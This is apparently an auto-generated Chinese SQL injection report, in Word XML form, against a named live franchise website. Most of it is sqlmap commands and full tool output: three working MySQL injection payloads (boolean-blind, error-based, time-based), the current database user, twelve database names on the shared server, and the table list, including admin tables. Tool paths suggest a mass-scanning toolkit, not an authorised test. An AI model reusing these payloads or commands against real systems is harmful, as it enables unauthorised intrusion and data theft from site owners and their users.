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漏洞类型：SQL注入漏洞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即当应用程序使用输入内容来构造动态SQL语句以访问数据库时，如果对输入的参数没有进行严格的过滤或者过滤不完整将会导致SQL注入攻击的产生。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>恶意用户通过构造特殊的SQL查询语句把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。从而可以获取到数据库的相关信息，包括数据库账号密码信息，甚至可上传木马，从而控制服务器。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞详情</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站漏洞报表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>注入网址:http://www.laio8.com/jiamengs/824*.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">执行命令:python sqlmap.py -u http://www.laio8.com/jiamengs/824*.html --random-agent --dbs  --current-user --current-db --is-db </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>注入参数(方式) : #1* (URI)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) RLIKE (SELECT (CASE WHEN (6291=6291) THEN 824 ELSE 0x28 END))-- bakn.html</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : error-based</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(3829=3829,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eyqC.html</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : AND/OR time-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL &gt;= 5.0.12 AND time-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) AND SLEEP(5)-- tvgC.html</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>服务器语言 : PHP 5.4.45, Apache</w:t>
        <w:br/>
        <w:br/>
        <w:t>数据库版本 : MySQL &gt;= 5.0</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站信息报表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>百度权重  2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站主页  http://www.laio8.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站描述  "seo综合查询可以查到该网站各大搜索引擎的信息，包括收录，反链及关键词排名，也可以一目了然的看到该域名的相关信息，比如域名年龄相关备案等等，及时调整网站优化。" /</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站标题  coco奶茶加盟多少钱|都可奶茶加盟|coco奶茶加盟网</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>IP__坐标  获取失败</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>所属__IP  获取失败</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站年龄  1年8月15天（创建于2017年08月18日,过期时间为2019年08月18日)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案编号  暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案性质  暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案名称  暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案时间  暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>百度收录  暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>协议类型  暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">页面类型   -  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">服务类型   - </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">程序语言   - </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站漏洞复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>执行命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">python sqlmap.py -u http://www.laio8.com/jiamengs/824*.html --random-agent --dbs  --current-user --current-db --is-db </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>返回结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="XiaoLv"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        ___</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">       __H__</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve"> ___ ___["]_____ ___ ___  {1.2.11.6#dev}</w:t>
        <w:br/>
        <w:br/>
        <w:t>|_ -| . [,]     | .'| . |</w:t>
        <w:br/>
        <w:br/>
        <w:t>|___|_  [(]_|_|_|__,|  _|</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">      |_|V          |_|   http://sqlmap.org</w:t>
        <w:br/>
        <w:br/>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br/>
        <w:br/>
        <w:t>[*] starting @ 00:45:36 /2019-05-03/</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[00:45:36] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.2.13) Gecko/20101206 Red Hat/3.6-2.el5 Firefox/3.6.13' from file 'D:\HACKER_TOOLS\LANGZI_HACKER\LANGZI_SQL_INJECTION\Auto_ExtrAct_1.0\sqlmap\txt\user-agents.txt'</w:t>
        <w:br/>
        <w:br/>
        <w:t>custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">[00:45:36] [INFO] resuming back-end DBMS 'mysql' </w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:36] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:br/>
        <w:t>sqlmap resumed the following injection point(s) from stored session:</w:t>
        <w:br/>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:br/>
        <w:t>Parameter: #1* (URI)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) RLIKE (SELECT (CASE WHEN (6291=6291) THEN 824 ELSE 0x28 END))-- bakn.html</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: error-based</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(3829=3829,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eyqC.html</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: AND/OR time-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL &gt;= 5.0.12 AND time-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) AND SLEEP(5)-- tvgC.html</w:t>
        <w:br/>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] the back-end DBMS is MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>web application technology: PHP 5.4.45, Apache</w:t>
        <w:br/>
        <w:br/>
        <w:t>back-end DBMS: MySQL &gt;= 5.0</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] fetching current user</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: seozhan@localhost</w:t>
        <w:br/>
        <w:br/>
        <w:t>current user:    'seozhan@localhost'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] fetching current database</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: laio8_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>current database:    'laio8_com'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] testing if current user is DBA</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] fetching current user</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [WARNING] reflective value(s) found and filtering out</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [WARNING] potential permission problems detected ('command denied')</w:t>
        <w:br/>
        <w:br/>
        <w:t>current user is DBA:    False</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] fetching database names</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] used SQL query returns 12 entries</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: information_schema</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: baoshifumbgd_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: cocodukenc_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: dekeshihb_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: dhxbjm_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: joincyd_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: laio8_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: manjijmw_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: mingdingbz_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: test</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: yddncjm1_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] resumed: zbpizzagw_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>available databases [12]:</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] baoshifumbgd_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] cocodukenc_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] dekeshihb_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] dhxbjm_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] information_schema</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] joincyd_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] laio8_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] manjijmw_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] mingdingbz_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] test</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] yddncjm1_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] zbpizzagw_com</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [WARNING] HTTP error codes detected during run:</w:t>
        <w:br/>
        <w:br/>
        <w:t>500 (Internal Server Error) - 1 times</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:37] [INFO] fetched data logged to text files under 'C:\Users\langzi\.sqlmap\output\www.laio8.com'</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[*] ending @ 00:45:37 /2019-05-03/</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>注入参数(方式) : #1* (URI)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) RLIKE (SELECT (CASE WHEN (6291=6291) THEN 824 ELSE 0x28 END))-- bakn.html</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : error-based</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(3829=3829,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eyqC.html</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : AND/OR time-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL &gt;= 5.0.12 AND time-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) AND SLEEP(5)-- tvgC.html</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>服务器语言 : PHP 5.4.45, Apache</w:t>
        <w:br/>
        <w:br/>
        <w:t>数据库版本 : MySQL &gt;= 5.0</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>当前用户:    'seozhan@localhost'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>当前数据库:    'laio8_com'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>是否有DBA权限:    False</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>所有数据库:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>[*] baoshifumbgd_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] cocodukenc_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] dekeshihb_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] dhxbjm_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] information_schema</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] joincyd_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] laio8_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] manjijmw_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] mingdingbz_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] test</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] yddncjm1_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] zbpizzagw_com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>执行命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">python sqlmap.py -u http://www.laio8.com/jiamengs/824*.html -D laio8_com --tables --random-agent </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>返回结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="XiaoLv"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        ___</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">       __H__</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve"> ___ ___[']_____ ___ ___  {1.2.11.6#dev}</w:t>
        <w:br/>
        <w:br/>
        <w:t>|_ -| . ["]     | .'| . |</w:t>
        <w:br/>
        <w:br/>
        <w:t>|___|_  [']_|_|_|__,|  _|</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">      |_|V          |_|   http://sqlmap.org</w:t>
        <w:br/>
        <w:br/>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br/>
        <w:br/>
        <w:t>[*] starting @ 00:45:42 /2019-05-03/</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[00:45:42] [INFO] fetched random HTTP User-Agent header value 'Opera/8.51 (Windows NT 5.1; U; pl)' from file 'D:\HACKER_TOOLS\LANGZI_HACKER\LANGZI_SQL_INJECTION\Auto_ExtrAct_1.0\sqlmap\txt\user-agents.txt'</w:t>
        <w:br/>
        <w:br/>
        <w:t>custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">[00:45:43] [INFO] resuming back-end DBMS 'mysql' </w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:br/>
        <w:t>sqlmap resumed the following injection point(s) from stored session:</w:t>
        <w:br/>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:br/>
        <w:t>Parameter: #1* (URI)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) RLIKE (SELECT (CASE WHEN (6291=6291) THEN 824 ELSE 0x28 END))-- bakn.html</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: error-based</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(3829=3829,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eyqC.html</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: AND/OR time-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL &gt;= 5.0.12 AND time-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) AND SLEEP(5)-- tvgC.html</w:t>
        <w:br/>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] the back-end DBMS is MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>web application technology: PHP 5.4.45, Apache</w:t>
        <w:br/>
        <w:br/>
        <w:t>back-end DBMS: MySQL &gt;= 5.0</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] fetching tables for database: 'laio8_com'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] used SQL query returns 19 entries</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: admin_login_log</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_ad</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_adflash</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_admin</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_adpos</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_archives</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_auth_group</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_auth_group_access</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_auth_rule</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_bot</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_cate</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_conf</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_html</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_keywords</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_link</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_model</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_model_fields</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_note</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] resumed: cms_wenzhang</w:t>
        <w:br/>
        <w:br/>
        <w:t>Database: laio8_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[19 tables]</w:t>
        <w:br/>
        <w:br/>
        <w:t>+-----------------------+</w:t>
        <w:br/>
        <w:br/>
        <w:t>| admin_login_log       |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_ad                |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_adflash           |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_admin             |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_adpos             |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_archives          |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_auth_group        |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_auth_group_access |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_auth_rule         |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_bot               |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_cate              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_conf              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_html              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_keywords          |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_link              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_model             |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_model_fields      |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_note              |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_wenzhang          |</w:t>
        <w:br/>
        <w:br/>
        <w:t>+-----------------------+</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[00:45:43] [INFO] fetched data logged to text files under 'C:\Users\langzi\.sqlmap\output\www.laio8.com'</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[*] ending @ 00:45:43 /2019-05-03/</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>当前数据库下存在如下表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>Database: laio8_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[19 tables]</w:t>
        <w:br/>
        <w:br/>
        <w:t>+-----------------------+</w:t>
        <w:br/>
        <w:br/>
        <w:t>| admin_login_log       |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_ad                |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_adflash           |</w:t>
        <w:br/>
        <w:br/>
        <w:t>| cms_admin             |</w:t>
        <w:br/>
